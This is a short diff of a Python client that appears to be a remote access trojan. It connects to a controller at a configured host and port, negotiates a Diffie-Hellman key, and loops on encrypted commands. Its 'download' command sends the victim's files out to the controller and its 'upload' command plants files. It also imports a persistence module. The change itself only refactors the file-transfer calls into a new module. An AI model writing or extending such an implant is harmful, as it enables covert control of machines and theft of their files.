@@ -13,8 +13,8 @@ import sys
 
 from core import common
 # from core import crypto
+from core import filesock
 from core import persistence
-from core.file import recvfile, sendfile
 
 # temporary
 from core.crypto import diffiehellman
@@ -32,11 +32,11 @@ FB_KEY  = '82e672ae054aa4de6f042c888111686a'
 def main():
     s = socket.socket()
     s.connect((HOST, PORT))
-    
+
     DHKEY = diffiehellman(s)
     # debug: confirm DHKEY matches
     # print binascii.hexlify(DHKEY)
-    
+
     while True:
         data = s.recv(1024)
         data = decrypt(data, DHKEY)
@@ -61,15 +61,13 @@ def main():
         elif cmd == 'download':
             for fname in action.split():
                 fname = fname.strip()
-                #print 'requested file: {}'.format(fname)
-                sendfile(s, fname, DHKEY)
+                filesock.sendfile(s, fname, DHKEY)
 
         # receive file
         elif cmd == 'upload':
             for fname in action.split():
                 fname = fname.strip()
-                #print 'receiving file: {}'.format(fname)
-                recvfile(s, fname, DHKEY)
+                filesock.recvfile(s, fname, DHKEY)
 
         # regenerate DH key (dangerous! may cause connection loss)
         # available in case a fallback occurs or you suspect evesdropping
